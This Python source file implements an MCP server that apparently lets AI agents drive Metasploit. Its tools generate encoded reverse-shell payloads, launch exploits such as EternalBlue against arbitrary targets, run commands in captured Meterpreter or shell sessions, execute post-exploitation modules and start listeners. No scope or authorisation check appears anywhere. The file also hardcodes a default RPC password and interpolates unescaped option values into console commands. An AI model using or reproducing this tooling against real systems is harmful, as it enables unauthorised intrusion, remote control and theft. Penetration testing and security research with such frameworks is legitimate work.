#!/usr/bin/env python3
"""
OpenSploit MCP Server: metasploit

Exploitation framework with persistent sessions via msfrpcd.
Uses pymetasploit3 RPC client so sessions survive across tool calls.
"""

import asyncio
import base64
import os
import re
import tempfile
import time
from typing import Any, Dict, List, Optional

from pymetasploit3.msfrpc import MsfRpcClient, ShellSession, MeterpreterSession

from mcp_common import BaseMCPServer, ToolResult, ToolError, sanitize_output


class MetasploitServer(BaseMCPServer):
    """MCP server wrapping Metasploit Framework via msfrpcd."""

    PAYLOAD_FORMATS = [
        "exe", "elf", "raw", "ruby", "python", "perl", "php", "asp",
        "aspx", "jsp", "war", "ps1", "psh", "vba", "c", "dll", "msi",
    ]

    COMMON_PAYLOADS = {
        "windows_reverse_tcp": "windows/meterpreter/reverse_tcp",
        "windows_reverse_https": "windows/meterpreter/reverse_https",
        "linux_reverse_tcp": "linux/x64/meterpreter/reverse_tcp",
        "linux_shell_tcp": "linux/x64/shell_reverse_tcp",
        "php_reverse": "php/meterpreter/reverse_tcp",
        "java_reverse": "java/meterpreter/reverse_tcp",
    }

    def __init__(self):
        super().__init__(
            name="metasploit",
            description="Exploitation framework with persistent sessions via msfrpcd",
            version="2.0.0",
        )

        self.client: Optional[MsfRpcClient] = None
        self.console = None  # Shared virtual console

        self.register_method(
            name="generate_payload",
            description="Generate a payload using msfvenom",
            params={
                "payload": {
                    "type": "string",
                    "required": True,
                    "description": "Payload name (e.g., 'windows/meterpreter/reverse_tcp') or shortcut (windows_reverse_tcp)",
                },
                "lhost": {
                    "type": "string",
                    "required": True,
                    "description": "Listening host IP for reverse connections",
                },
                "lport": {
                    "type": "integer",
                    "required": True,
                    "description": "Listening port for reverse connections",
                },
                "format": {
                    "type": "string",
                    "default": "raw",
                    "description": "Output format: exe, elf, raw, ruby, python, php, asp, c, dll, etc.",
                },
                "encoder": {
                    "type": "string",
                    "description": "Encoder to use (e.g., 'x86/shikata_ga_nai')",
                },
                "iterations": {
                    "type": "integer",
                    "default": 1,
                    "description": "Number of encoding iterations",
                },
            },
            handler=self.generate_payload,
        )

        self.register_method(
            name="search_modules",
            description="Search for Metasploit modules",
            params={
                "query": {
                    "type": "string",
                    "required": True,
                    "description": "Search query (e.g., 'ms17-010', 'apache struts', 'smb')",
                },
                "type": {
                    "type": "string",
                    "enum": ["all", "exploit", "auxiliary", "post", "payload"],
                    "default": "all",
                    "description": "Module type to search for",
                },
            },
            handler=self.search_modules,
        )

        self.register_method(
            name="check_vuln",
            description="Check if a target is vulnerable using an auxiliary scanner module",
            params={
                "module": {
                    "type": "string",
                    "required": True,
                    "description": "Auxiliary module path (e.g., 'auxiliary/scanner/smb/smb_ms17_010')",
                },
                "rhosts": {
                    "type": "string",
                    "required": True,
                    "description": "Target host(s)",
                },
                "options": {
                    "type": "object",
                    "description": "Additional module options as key-value pairs",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.check_vuln,
        )

        self.register_method(
            name="run_exploit",
            description="Run an exploit module against a target",
            params={
                "module": {
                    "type": "string",
                    "required": True,
                    "description": "Exploit module path (e.g., 'exploit/windows/smb/ms17_010_eternalblue')",
                },
                "rhosts": {
                    "type": "string",
                    "required": True,
                    "description": "Target host(s)",
                },
                "payload": {
                    "type": "string",
                    "description": "Payload to use",
                },
                "lhost": {
                    "type": "string",
                    "description": "Listening host for reverse payloads",
                },
                "lport": {
                    "type": "integer",
                    "description": "Listening port for reverse payloads",
                },
                "options": {
                    "type": "object",
                    "description": "Additional module options",
                },
                "timeout": {
                    "type": "integer",
                    "default": 300,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.run_exploit,
        )

        self.register_method(
            name="exec_command",
            description="Execute a command on target using an exploit with cmd/unix/generic payload",
            params={
                "module": {
                    "type": "string",
                    "required": True,
                    "description": "Exploit module path that supports command execution",
                },
                "rhosts": {
                    "type": "string",
                    "required": True,
                    "description": "Target host(s)",
                },
                "command": {
                    "type": "string",
                    "required": True,
                    "description": "Command to execute on the target",
                },
                "options": {
                    "type": "object",
                    "description": "Additional module options (e.g., RPORT, TARGETURI)",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.exec_command,
        )

        self.register_method(
            name="list_sessions",
            description="List active Meterpreter/shell sessions",
            params={
                "timeout": {
                    "type": "integer",
                    "default": 30,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.list_sessions,
        )

        self.register_method(
            name="session_command",
            description="Run a command in an active session",
            params={
                "session_id": {
                    "type": "integer",
                    "required": True,
                    "description": "Session ID to interact with",
                },
                "command": {
                    "type": "string",
                    "required": True,
                    "description": "Command to execute in the session",
                },
                "timeout": {
                    "type": "integer",
                    "default": 60,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.session_command,
        )

        self.register_method(
            name="post_module",
            description="Run a post-exploitation module on a session",
            params={
                "module": {
                    "type": "string",
                    "required": True,
                    "description": "Post module path (e.g., 'post/multi/gather/env')",
                },
                "session_id": {
                    "type": "integer",
                    "required": True,
                    "description": "Session ID to run the module on",
                },
                "options": {
                    "type": "object",
                    "description": "Additional module options",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.post_module,
        )

        self.register_method(
            name="handler",
            description="Start a multi/handler to catch reverse shells",
            params={
                "payload": {
                    "type": "string",
                    "required": True,
                    "description": "Payload to listen for (e.g., 'windows_reverse_tcp')",
                },
                "lhost": {
                    "type": "string",
                    "required": True,
                    "description": "Listening host IP",
                },
                "lport": {
                    "type": "integer",
                    "required": True,
                    "description": "Listening port",
                },
                "timeout": {
                    "type": "integer",
                    "default": 300,
                    "description": "Timeout waiting for connection (seconds)",
                },
            },
            handler=self.start_handler,
        )

    # ── Helpers ──────────────────────────────────────────────────────────

    def _resolve_payload(self, payload: str) -> str:
        """Resolve payload shortcut to full name."""
        return self.COMMON_PAYLOADS.get(payload, payload)

    def _parse_search_output(self, output: str) -> List[Dict[str, str]]:
        """Parse msfconsole search output."""
        modules = []

        for line in output.split("\n"):
            line = line.strip()
            if not line or line.startswith("#") or line.startswith("="):
                continue

            # Match lines like: "0  exploit/windows/smb/ms17_010_eternalblue  ..."
            match = re.match(r"\s*\d+\s+(exploit|auxiliary|post|payload)/(\S+)\s+(.*)", line)
            if match:
                modules.append({
                    "type": match.group(1),
                    "path": f"{match.group(1)}/{match.group(2)}",
                    "info": match.group(3).strip(),
                })

        return modules

    async def _ensure_connected(self) -> None:
        """Lazy-init RPC client and shared console. Retries up to 60s."""
        if self.client is not None:
            # Verify connection is still alive
            try:
                self.client.core.version()
                return
            except Exception:
                self.logger.warning("msfrpcd connection lost, reconnecting...")
                self.client = None
                self.console = None

        password = os.environ.get("MSF_PASSWORD", "msfpassword")
        last_err = None

        for attempt in range(30):
            try:
                self.client = MsfRpcClient(
                    password, server="127.0.0.1", port=55553, ssl=False
                )
                self.logger.info("Connected to msfrpcd")

                # Create shared console
                self.console = self.client.consoles.console()

                # Wait for console to initialize and drain banner
                await asyncio.sleep(2)
                self.console.read()
                self.logger.info(f"Created shared console (cid={self.console.cid})")
                return

            except Exception as e:
                last_err = e
                self.logger.warning(
                    f"msfrpcd not ready (attempt {attempt + 1}/30): {e}"
                )
                self.client = None
                self.console = None
                await asyncio.sleep(2)

        raise ToolError(
            message="Failed to connect to msfrpcd after 60 seconds",
            details=str(last_err),
        )

    async def _console_exec(self, commands: str, timeout: int = 120) -> str:
        """Write commands to shared console and poll until complete."""
        await self._ensure_connected()

        # Drain any pending output from previous commands
        await asyncio.to_thread(self.console.read)

        # Write commands to console
        await asyncio.to_thread(self.console.write, commands + "\n")

        # Poll until console is no longer busy
        output = ""
        start = time.time()
        await asyncio.sleep(1)  # Give msfrpcd time to start processing

        while time.time() - start < timeout:
            res = await asyncio.to_thread(self.console.read)
            output += res["data"]

            if not res["busy"]:
                # If no output yet and it's very early, command may not have started
                if not output.strip() and time.time() - start < 5:
                    await asyncio.sleep(1)
                    continue
                break

            await asyncio.sleep(0.5)
        else:
            raise ToolError(
                message=f"Console command timed out after {timeout}s",
                details=output[:2000],
            )

        return output

    # ── Tool Methods ─────────────────────────────────────────────────────

    async def generate_payload(
        self,
        payload: str,
        lhost: str,
        lport: int,
        format: str = "raw",
        encoder: Optional[str] = None,
        iterations: int = 1,
    ) -> ToolResult:
        """Generate a payload using msfvenom (direct subprocess — stateless)."""
        self.logger.info(f"Generating payload: {payload}")

        payload_name = self._resolve_payload(payload)

        with tempfile.NamedTemporaryFile(delete=False, suffix=f".{format}") as f:
            output_file = f.name

        try:
            args = [
                "msfvenom",
                "-p", payload_name,
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "-f", format,
                "-o", output_file,
            ]

            if encoder:
                args.extend(["-e", encoder, "-i", str(iterations)])

            self.logger.info(f"Running: msfvenom -p {payload_name} ...")
            result = await self.run_command(args, timeout=120)

            # Read generated payload
            payload_data = None
            payload_bytes = b""
            if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                with open(output_file, "rb") as f:
                    payload_bytes = f.read()
                    payload_data = base64.b64encode(payload_bytes).decode("utf-8")

            return ToolResult(
                success=True,
                data={
                    "payload": payload_name,
                    "lhost": lhost,
                    "lport": lport,
                    "format": format,
                    "size_bytes": len(payload_bytes),
                    "payload_base64": payload_data,
                    "encoder": encoder,
                },
                raw_output=sanitize_output(result.stdout + result.stderr),
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )
        finally:
            if os.path.exists(output_file):
                os.unlink(output_file)

    async def search_modules(
        self,
        query: str,
        type: str = "all",
    ) -> ToolResult:
        """Search for Metasploit modules via msfrpcd console."""
        self.logger.info(f"Searching modules: {query}")

        search_cmd = f"search {query}"
        if type != "all":
            search_cmd = f"search type:{type} {query}"

        try:
            output = await self._console_exec(search_cmd, timeout=60)
            modules = self._parse_search_output(output)

            return ToolResult(
                success=True,
                data={
                    "query": query,
                    "type": type,
                    "modules": modules,
                    "count": len(modules),
                },
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )

    async def check_vuln(
        self,
        module: str,
        rhosts: str,
        options: Optional[Dict[str, Any]] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Check if a target is vulnerable using an auxiliary scanner."""
        self.logger.info(f"Checking vulnerability with {module} against {rhosts}")

        cmds = [
            f"use {module}",
            f"set RHOSTS {rhosts}",
        ]

        if options:
            for key, value in options.items():
                cmds.append(f"set {key} {value}")

        cmds.append("run")

        try:
            output = await self._console_exec("\n".join(cmds), timeout=timeout)

            vulnerable = any(
                x in output.lower()
                for x in ["vulnerable", "likely vulnerable", "is vulnerable"]
            )

            return ToolResult(
                success=True,
                data={
                    "module": module,
                    "target": rhosts,
                    "vulnerable": vulnerable,
                },
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )

    async def run_exploit(
        self,
        module: str,
        rhosts: str,
        payload: Optional[str] = None,
        lhost: Optional[str] = None,
        lport: Optional[int] = None,
        options: Optional[Dict[str, Any]] = None,
        timeout: int = 300,
    ) -> ToolResult:
        """Run an exploit module against a target. Sessions persist in msfrpcd."""
        self.logger.info(f"Running exploit {module} against {rhosts}")

        try:
            await self._ensure_connected()

            # Snapshot sessions before exploit
            before = set(self.client.sessions.list.keys())

            # Build console commands
            cmds = [
                f"use {module}",
                f"set RHOSTS {rhosts}",
            ]

            if payload:
                cmds.append(f"set PAYLOAD {self._resolve_payload(payload)}")
            if lhost:
                cmds.append(f"set LHOST {lhost}")
            if lport:
                cmds.append(f"set LPORT {lport}")

            if options:
                for key, value in options.items():
                    cmds.append(f"set {key} {value}")

            cmds.append("exploit -j")  # Run as background job

            output = await self._console_exec("\n".join(cmds), timeout=timeout)

            # Wait for session to establish
            await asyncio.sleep(3)

            # Snapshot sessions after exploit
            after_sessions = self.client.sessions.list
            after = set(after_sessions.keys())
            new_session_ids = after - before

            # Build session details
            sessions = []
            for sid in sorted(new_session_ids, key=int):
                s = after_sessions[sid]
                sessions.append({
                    "id": int(sid),
                    "type": s.get("type", "unknown"),
                    "info": s.get("info", ""),
                    "via_exploit": s.get("via_exploit", ""),
                    "tunnel_peer": s.get("tunnel_peer", ""),
                })

            exploit_success = bool(sessions) or "exploit completed" in output.lower()

            return ToolResult(
                success=True,
                data={
                    "module": module,
                    "target": rhosts,
                    "exploit_success": exploit_success,
                    "sessions": sessions,
                    "session_count": len(sessions),
                },
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )

    async def exec_command(
        self,
        module: str,
        rhosts: str,
        command: str,
        options: Optional[Dict[str, Any]] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Execute a command on target using an exploit with cmd payload."""
        self.logger.info(f"Executing command via {module} on {rhosts}: {command}")

        cmds = [
            f"use {module}",
            f"set RHOSTS {rhosts}",
            "set PAYLOAD cmd/unix/generic",
            f"set CMD {command}",
        ]

        if options:
            for key, value in options.items():
                cmds.append(f"set {key} {value}")

        cmds.append("run")

        try:
            output = await self._console_exec("\n".join(cmds), timeout=timeout)

            # Parse the output to extract command results
            command_output = ""
            exploit_success = False

            if "exploit completed" in output.lower() or "command executed" in output.lower():
                exploit_success = True

            # Extract command output from the console output
            lines = output.split("\n")
            capture = False
            for line in lines:
                if line.startswith("[*]") or line.startswith("[+]") or line.startswith("[-]"):
                    if "executing" in line.lower() or "command" in line.lower():
                        capture = True
                        exploit_success = True
                    continue
                if capture and line.strip():
                    command_output += line + "\n"

            return ToolResult(
                success=True,
                data={
                    "module": module,
                    "target": rhosts,
                    "command": command,
                    "exploit_success": exploit_success,
                    "command_output": command_output.strip() if command_output else None,
                },
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )

    async def list_sessions(
        self,
        timeout: int = 30,
    ) -> ToolResult:
        """List active Meterpreter/shell sessions from msfrpcd."""
        self.logger.info("Listing active sessions")

        try:
            await self._ensure_connected()

            sessions_dict = self.client.sessions.list
            sessions = []
            for sid, info in sessions_dict.items():
                sessions.append({
                    "id": int(sid),
                    "type": info.get("type", "unknown"),
                    "info": info.get("info", ""),
                    "tunnel_local": info.get("tunnel_local", ""),
                    "tunnel_peer": info.get("tunnel_peer", ""),
                    "via_exploit": info.get("via_exploit", ""),
                    "via_payload": info.get("via_payload", ""),
                    "platform": info.get("platform", ""),
                    "arch": info.get("arch", ""),
                })

            return ToolResult(
                success=True,
                data={
                    "sessions": sessions,
                    "count": len(sessions),
                },
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )

    async def session_command(
        self,
        session_id: int,
        command: str,
        timeout: int = 60,
    ) -> ToolResult:
        """Run a command in an active session via msfrpcd."""
        self.logger.info(f"Running command in session {session_id}: {command}")

        try:
            await self._ensure_connected()

            # Verify session exists (handle both int and str keys from msgpack)
            sessions = self.client.sessions.list
            session_info = sessions.get(str(session_id)) or sessions.get(session_id)
            if session_info is None:
                available = [int(k) for k in sessions.keys()]
                return ToolResult(
                    success=False,
                    data={},
                    error=f"Session {session_id} not found. Active sessions: {available}",
                )
            session_type = session_info.get("type", "shell")

            # Bypass pymetasploit3's session() which makes a redundant RPC
            # call that can fail due to int/str key mismatch in msgpack
            if session_type == "meterpreter":
                session = MeterpreterSession(session_id, self.client, session_info)
            else:
                session = ShellSession(session_id, self.client, session_info)

            if session_type == "meterpreter":
                # Meterpreter: use run_with_output for synchronous command execution
                output = await asyncio.to_thread(
                    lambda: session.run_with_output(command, timeout=timeout)
                )
            else:
                # Shell: write command and poll until output stabilizes
                await asyncio.to_thread(session.write, command + "\n")
                output = ""
                stable_count = 0
                deadline = time.time() + timeout
                await asyncio.sleep(0.5)

                while time.time() < deadline:
                    chunk = await asyncio.to_thread(session.read)
                    if isinstance(chunk, dict):
                        chunk = chunk.get("data", "")
                    if chunk:
                        output += chunk
                        stable_count = 0
                    else:
                        stable_count += 1
                        if stable_count >= 3:  # No new data for ~1.5s
                            break
                    await asyncio.sleep(0.5)

            if isinstance(output, dict):
                output = output.get("data", "")

            return ToolResult(
                success=True,
                data={
                    "session_id": session_id,
                    "command": command,
                    "output": output.strip() if isinstance(output, str) else str(output),
                },
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )
        except Exception as e:
            return ToolResult(
                success=False,
                data={},
                error=f"Session command failed: {e}",
            )

    async def post_module(
        self,
        module: str,
        session_id: int,
        options: Optional[Dict[str, Any]] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Run a post-exploitation module on a session via msfrpcd console."""
        self.logger.info(f"Running post module {module} on session {session_id}")

        cmds = [
            f"use {module}",
            f"set SESSION {session_id}",
        ]

        if options:
            for key, value in options.items():
                cmds.append(f"set {key} {value}")

        cmds.append("run")

        try:
            output = await self._console_exec("\n".join(cmds), timeout=timeout)

            return ToolResult(
                success=True,
                data={
                    "module": module,
                    "session_id": session_id,
                },
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )

    async def start_handler(
        self,
        payload: str,
        lhost: str,
        lport: int,
        timeout: int = 300,
    ) -> ToolResult:
        """Start a multi/handler to catch reverse shells. Handler persists in msfrpcd."""
        self.logger.info(f"Starting handler for {payload} on {lhost}:{lport}")

        payload_name = self._resolve_payload(payload)

        cmds = [
            "use exploit/multi/handler",
            f"set PAYLOAD {payload_name}",
            f"set LHOST {lhost}",
            f"set LPORT {lport}",
            "set ExitOnSession false",
            "exploit -j",
        ]

        try:
            output = await self._console_exec("\n".join(cmds), timeout=30)

            # Extract job ID from output (e.g., "[*] Exploit running as background job 0.")
            job_id = None
            match = re.search(r"background job (\d+)", output)
            if match:
                job_id = match.group(1)

            handler_started = "started" in output.lower() and "handler" in output.lower()

            return ToolResult(
                success=True,
                data={
                    "payload": payload_name,
                    "lhost": lhost,
                    "lport": lport,
                    "handler_started": handler_started,
                    "job_id": job_id,
                },
                raw_output=sanitize_output(output),
            )

        except ToolError as e:
            return ToolResult(
                success=False,
                data={},
                error=str(e),
            )


if __name__ == "__main__":
    MetasploitServer.main()
